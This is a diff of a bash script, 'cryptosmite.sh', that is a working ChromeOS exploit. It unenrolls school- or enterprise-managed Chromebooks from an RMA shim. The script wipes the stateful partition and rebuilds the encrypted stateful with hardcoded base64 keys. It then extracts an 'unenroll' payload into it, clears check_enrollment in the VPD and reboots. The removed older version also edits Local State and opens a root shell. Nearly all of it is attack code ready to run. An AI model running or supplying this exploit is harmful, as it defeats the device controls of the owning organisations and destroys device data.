@@ -1,164 +1,139 @@
 #!/bin/bash
-# [THIS IS A SERIOUS EXPLOIT. IT ALLOWS FOR CHROMEOS PERSISTENCE]
-# Run this on a rma shim.
+#
+# cryptosmite.sh remake or something
+# by Writable and OlyB
+#
+# unenroll only for now, will add more features later
+#
 
-# Encryption keys related to CryptoSmite
-packedkey () {
-    cat <<EOF | base64 -d
+set -eE
+
+SCRIPT_DATE="[2024-01-28]"
+BACKUP_PAYLOAD=unenroll.tar.xz
+NEW_ENCSTATEFUL_SIZE=$((1024 * 1024 * 1024)) # 1 GB
+
+[ -z "$SENSITIVE_MODE" ] && SENSITIVE_MODE=0
+
+fail() {
+	printf "%b\n" "$*" >&2
+	exit 1
+}
+
+echo_sensitive() {
+	if [ "$SENSITIVE_MODE" -eq 1 ]; then
+		echo "Doing something"
+	else
+		echo "$@"
+	fi
+}
+
+get_largest_cros_blockdev() {
+	local largest size dev_name tmp_size remo
+	size=0
+	for blockdev in /sys/block/*; do
+		dev_name="${blockdev##*/}"
+		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
+		tmp_size=$(cat "$blockdev"/size)
+		remo=$(cat "$blockdev"/removable)
+		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
+			case "$(sfdisk -l -o name "/dev/$dev_name" 2>/dev/null)" in
+				*STATE*KERN-A*ROOT-A*KERN-B*ROOT-B*)
+					largest="/dev/$dev_name"
+					size="$tmp_size"
+					;;
+			esac
+		fi
+	done
+	echo "$largest"
+}
+
+format_part_number() {
+	echo -n "$1"
+	echo "$1" | grep -q '[0-9]$' && echo -n p
+	echo "$2"
+}
+
+cleanup() {
+	umount "$ENCSTATEFUL_MNT" || :
+	cryptsetup close encstateful || :
+	umount "$STATEFUL_MNT" || :
+	trap - EXIT INT
+}
+
+key_crosencstateful() {
+	cat <<EOF | base64 -d
 24Ep0qun5ICJWbKYmhcwtN5tkMrqPDhDN5EonLetftgqrjbiUD3AqnRoRVKw+m7l
 EOF
-    return;
 }
 
-# Local State EnrollmentRecoveryRequired
-err_exploit () {
-    echo "Editing the err in Local State";
-}
-LOCALSTATEMOD=0
-
-#Definitely not taken from the chromium source code
-# Get destination hard drive
-get_largest_nvme_namespace() { 
-  local largest size tmp_size dev
-  size=0
-  dev=$(basename "$1")
-
-  for nvme in /sys/block/"${dev%n*}"*; do
-    tmp_size=$(cat "${nvme}"/size)
-    if [ "${tmp_size}" -gt "${size}" ]; then
-      largest="${nvme##*/}"
-      size="${tmp_size}"
-    fi
-  done
-  echo "${largest}"
-}
-
-#Cryptosmite encryption key for file system
-packedecryptfs() {
-    cat <<EOF | base64 -d
+key_ecryptfs() {
+	cat <<EOF | base64 -d
 p2/YL2slzb2JoRWCMaGRl1W0gyhUjNQirmq8qzMN4Do=
 EOF
-return;
 }
 
-# Embed cryptsetup in shim functions
-cryptsetupx() {
-    mount --bind /dev /mnt/shim_stateful/cryptsetup_root/dev
-    mount --bind /proc /mnt/shim_stateful/cryptsetup_root/proc
-    mount --bind /sys /mnt/shim_stateful/cryptsetup_root/sys
-    mount --bind /mnt/sp1 /mnt/shim_stateful/cryptsetup_root/mnt
-    packedecryptfs > /mnt/shim_stateful/cryptsetup_root/enc.key
-    echo "You may now see the encryption key that is used to create the stateful partition. Check cryptsetup_root"
-    cat <<EOF > /mnt/shim_stateful/cryptsetup_root/xyz.sh
-echo "Using cryptsetup..."
-cryptsetup open --key-file /enc.key --type plain /mnt/encrypted.block enc
-EOF
-    chroot /mnt/shim_stateful/cryptsetup_root sh /xyz.sh
-    if [ ${LOCALSTATEMOD} -gt 0 ]
-    then
-        echo "Skipping erasing encrypted partition"
-    else
-        mkfs.ext4 /dev/mapper/enc
-    fi
-    
-    mkdir -p /mnt/stateful
-    mount -o loop,"${1}",noload /dev/mapper/enc /mnt/stateful
-    
-}
-cryptsetupendx() {
-    cat <<EOF > /mnt/shim_stateful/cryptsetup_root/xyz.sh
-echo "Cleaning up cryptsetup mount"
-cryptsetup close enc
-EOF
-    chroot /mnt/shim_stateful/cryptsetup_root sh /xyz.sh
-    umount /mnt/shim_stateful/cryptsetup_root/mnt
+[ -f "$BACKUP_PAYLOAD" ] || fail "$BACKUP_PAYLOAD not found!"
 
+CROS_DEV="$(get_largest_cros_blockdev)"
+[ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"
 
-}
-getstage2() {
-    cat <<EOF >> /mnt/encrypted_block/stage2.sh
+TARGET_PART="$(format_part_number "$CROS_DEV" 1)"
+[ -b "$TARGET_PART" ] || fail "$TARGET_PART is not a block device!"
 
-EOF
-}
-endstage2() {
-    cat <<EOF >> /mnt/encrypted_block/endstage2.sh
-echo "Cleaning up Stage II"
-echo "Unmounting enc-block"
-umount 
-cryptsetup close /dev/mapper/enc
-EOF
-}
-createfilewithsize() {
-    dd if=/dev/urandom of=$1 count=1 bs=$2
-}
-{
-if [ $# -gt 0 ]
-then
-    echo "Editing local state information to remove FWMP"
-    LOCALSTATEMOD=1
-fi
-mkdir /mnt/shim_stateful
-mount -o loop,rw /dev/disk/by-label/shimstate /mnt/shim_stateful
-mkdir -p /mnt/sp1
-if [ ${LOCALSTATEMOD} -gt 0 ] 
-then
-    LOOPDEV=$(losetup -o 0 --find --show "/dev/$(get_largest_nvme_namespace)p1")
+trap 'echo $BASH_COMMAND failed with exit code $?.' ERR
+trap 'cleanup; exit' EXIT
+trap 'echo Abort.; cleanup; exit' INT
 
-    mount -o ro $LOOPDEV /mnt/sp1
-    cryptsetupx ro
-    echo "Backing up original stateful to shim_stateful"
-    cd /mnt/stateful
-    mkdir -p /mnt/shim_stateful/$(dirname ${1})
-    # Command below should backup encrypted stateful to the shim stateful with our known key, and the path provided as parameter #1. 
-    tar -cvf /mnt/shim_stateful/${1} . 
-    echo "Backed up now, continuing..."
-    cd
-    umount /mnt/stateful
-    cryptsetupendx
-    losetup -D
-fi
-umount /mnt/sp1
-losetup -D
-mkfs.ext4 "/dev/$(get_largest_nvme_namespace)p1" 
-mount -o loop,rw "/dev/$(get_largest_nvme_namespace)p1" /mnt/sp1
-cd /mnt/sp1
+clear
+echo "Welcome to Cryptosmite."
+echo "Script date: ${SCRIPT_DATE}"
+echo ""
+echo "This will destroy all data on ${TARGET_PART} and unenroll the device."
+echo "Note that this exploit is patched on some release of ChromeOS r120 and LTS r114."
+echo "Continue? (y/N)"
+read -r action
+case "$action" in
+	[yY]) : ;;
+	*) fail "Abort." ;;
+esac
 
-if [ -f /mnt/sp1/encrypted.key ]
-then
-    rm -f /mnt/sp1/encrypted.key
-fi
-echo "Using the key packed with cryptosmite. It will be a key you generate later."
-packedkey > encrypted.needs-finalization
-echo "Finding cryptsetup.tar.xz at /usr/local/cryptsetup.tar.xz"
-# we erase before getting here anyways
-#rm /mnt/sp1/encrypted.block
-dd if=/dev/zero of=/mnt/sp1/encrypted.block bs=1M count=1024 status=progress # Hopefully 1GB is good enough
+echo_sensitive "Wiping and mounting stateful"
+mkfs.ext4 -F "$TARGET_PART" >/dev/null 2>&1
+STATEFUL_MNT=$(mktemp -d)
+mkdir -p "$STATEFUL_MNT"
+mount "$TARGET_PART" "$STATEFUL_MNT"
 
-cryptsetupx rw
+echo_sensitive "Setting up encstateful"
+truncate -s "$NEW_ENCSTATEFUL_SIZE" "$STATEFUL_MNT"/encrypted.block
+ENCSTATEFUL_KEY=$(mktemp)
+key_ecryptfs > "$ENCSTATEFUL_KEY"
+cryptsetup open --type plain --cipher aes-cbc-essiv:sha256 --key-size 256 --key-file "$ENCSTATEFUL_KEY" "$STATEFUL_MNT"/encrypted.block encstateful
 
-#Ed your stateful in bash terminal
-echo "Edit your stateful here in /mnt/stateful and exit to save changes"
-if [ ${LOCALSTATEMOD} -gt 0 ]
-then
-    echo "Running sed command on Local State"
-    echo "Extracting stateful backup"
-    tar -xvf /mnt/shim_stateful/stateful_bak.tar.xz -C /mnt/stateful
-    sed -i 's/\"EnrollmentRecoveryRequired\":false/\"EnrollmentRecoveryRequired\":true/g' /mnt/stateful/chronos/Local\ State
-    echo "DO NOT RUN THE TAR COMMAND, INSTEAD EXIT THE SHELL UNLESS YOU NEED TO MODIFY SOMETHING ELSE"
-fi
-su -p -c "bash -i"
+echo_sensitive "Wiping and mounting encstateful"
+mkfs.ext4 -F /dev/mapper/encstateful >/dev/null 2>&1
+ENCSTATEFUL_MNT=$(mktemp -d)
+mkdir -p "$ENCSTATEFUL_MNT"
+mount /dev/mapper/encstateful "$ENCSTATEFUL_MNT"
 
-#Clean ups
-umount /mnt/stateful
-cryptsetupendx
-crossystem disable_dev_request=1
+echo_sensitive "Dropping encstateful key"
+key_crosencstateful > "$STATEFUL_MNT"/encrypted.needs-finalization
+
+echo_sensitive -n "Extracting backup to encstateful"
+tar -xJf "$BACKUP_PAYLOAD" -C "$ENCSTATEFUL_MNT" --checkpoint=.100
+echo ""
+
+echo "Cleaning up"
+cleanup
+
+vpd -i RW_VPD -s check_enrollment=0 || : # this doesn't get set automatically
+crossystem disable_dev_request=1 || :
 crossystem disable_dev_request=1 # grunt weirdness
 echo "SMITED SUCCESSFULLY!"
+echo ""
+echo "Exploit and original POC created by Writable (unretained)"
+echo "This script created by OlyB"
+echo ""
 echo "Rebooting in 3 seconds"
 sleep 3
 reboot -f
-} || {
-    echo "Cleaing up, exploit failed"
-    umount /mnt/sp1
-    exit 0
-}
+sleep infinity
